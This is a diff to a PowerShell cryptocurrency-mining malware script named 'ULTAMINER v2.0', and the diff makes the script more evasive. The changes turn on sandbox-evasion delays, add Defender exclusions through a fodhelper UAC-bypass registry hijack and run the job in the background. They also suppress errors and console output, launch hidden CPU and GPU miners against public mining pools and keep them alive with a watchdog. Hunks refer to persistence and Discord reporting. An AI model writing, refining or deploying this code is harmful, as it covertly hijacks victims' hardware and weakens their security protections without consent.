@@ -1,8 +1,8 @@
 # === ULTAMINER v2.0 ===
 if (Test-Path "$PSScriptRoot\.lock") { return }
 
-# $ProgressPreference = 'SilentlyContinue'
-# $ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12
 [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 
@@ -36,8 +36,7 @@ function Test-Sandbox {
     return $hits -ge 2
 }
 
-# Initial sleep removed for "Fast Ingest"
-# if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); return }
+if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); return }
 
 # === CONFIG (fragmented) ===
 $c = @{}
@@ -80,28 +79,21 @@ try {
     $hw.cores = [int]$cpu.NumberOfCores
 } catch {}
 try { $hw.ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1) } catch {}
-try {
     $vcs = Get-CimInstance Win32_VideoController -EA 0
     foreach ($vc in $vcs) {
         $n = $vc.Name.ToUpper()
-        if ($n -match 'NVIDIA|AMD|RADEON|RTX|GTX|RX\s?\d' -and $vc.AdapterRAM -gt 3GB) {
-            if ($n -notmatch 'BASIC|DISPLAY|VIRTUAL') {
-                $hw.gpu = $true; $hw.gpuName = $vc.Name.Trim(); 
-                Write-Host "[+] High-Performance GPU Detected: $($hw.gpuName)"
-                break
+        if ($n -match 'NVIDIA|AMD|RADEON|RTX|GTX|RX\s?\d') {
+            if ($n -notmatch 'BASIC|DISPLAY|VIRTUAL|VEGA|INTEGRATED' -and $vc.AdapterRAM -gt 2GB) {
+                $hw.gpu = $true; $hw.gpuName = $vc.Name.Trim(); break
             }
         }
     }
-    if (-not $hw.gpu) { Write-Host "[*] No compatible GPU found. Falling back to CPU only." }
 } catch {}
 
-try {
-    $exPaths = @($env:LOCALAPPDATA, "$env:LOCALAPPDATA\Microsoft", "$env:APPDATA\Microsoft", $env:TEMP)
-    # Try direct first (works if admin)
-    foreach ($ep in $exPaths) {
-        try { Add-MpPreference -ExclusionPath $ep -EA Stop } catch {}
-    }
-    # fodhelper UAC bypass for non-admin
+# Defender exclusion in background — don't block main thread
+Start-Job -ScriptBlock {
+    param($exPaths)
+    foreach ($ep in $exPaths) { try { Add-MpPreference -ExclusionPath $ep -EA Stop } catch {} }
     try {
         $psCmd = ($exPaths | ForEach-Object { "Add-MpPreference -ExclusionPath '$_' -EA 0" }) -join '; '
         $regPath = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
@@ -112,7 +104,7 @@ try {
         Start-Sleep 5
         Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force -EA 0
     } catch {}
-} catch {}
+} -ArgumentList (,$exPaths) | Out-Null
 
 # === ASYNC PERSISTENCE (Fast Ingest) ===
 Start-Job -ScriptBlock {
@@ -237,21 +229,21 @@ if ($hw.gpu) {
     }
 }
 
+# Wait for Defender exclusion to propagate
+Start-Sleep -Seconds 10
+
 # === LAUNCH MINERS ===
 if (Test-Path $cpuExe) {
     $cpuArgs = "-o pool.supportxmr.com:3333 -u $($c.addr) -p WinSys_$mName -a rx -k --cpu-max-threads-hint 35 --cpu-priority 0 --asm=auto --donate-level 1"
-    Write-Host "[*] Launching CPU miner: $cpuArgs"
-    $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru
-    Write-Host "[+] CPU Miner LAUNCHED - PID: $($cpuProc.Id)"
-} else {
-    Write-Host "[!] CPU miner binary not found!"
+    $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0
+    # Retry once if launch failed
+    if (!$cpuProc) { Start-Sleep 3; $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0 }
 }
 
 if ($gpuExe -and (Test-Path $gpuExe)) {
     $gpuArgs = "--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:$($c.addr).WinSys_${mName}_G#1871184566 --pass x --intensity 25 --ssl 0"
-    Write-Host "[*] Launching GPU miner: $gpuArgs"
-    $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru
-    Write-Host "[+] GPU Miner LAUNCHED - PID: $($gpuProc.Id)"
+    $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru -EA 0
+    if (!$gpuProc) { Start-Sleep 3; $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru -EA 0 }
 }
 
 # === RICH DISCORD NOTIFICATION ===
@@ -276,14 +268,14 @@ Write-Host "[*] Watchdog active. Monitoring miners..."
 while ($true) {
     Start-Sleep -Seconds 30
     if ($cpuProc -and $cpuProc.HasExited) {
-        Write-Host "[!] CPU miner died. Restarting..."
-        $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru
-        Write-Host "[+] CPU Restarted PID: $($cpuProc.Id)"
+        if (Test-Path $cpuExe) {
+            $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0
+        }
     }
     if ($gpuProc -and $gpuProc.HasExited) {
-        Write-Host "[!] GPU miner died. Restarting..."
-        $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru
-        Write-Host "[+] GPU Restarted PID: $($gpuProc.Id)"
+        if (Test-Path $gpuExe) {
+            $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru -EA 0
+        }
     }
 }
 
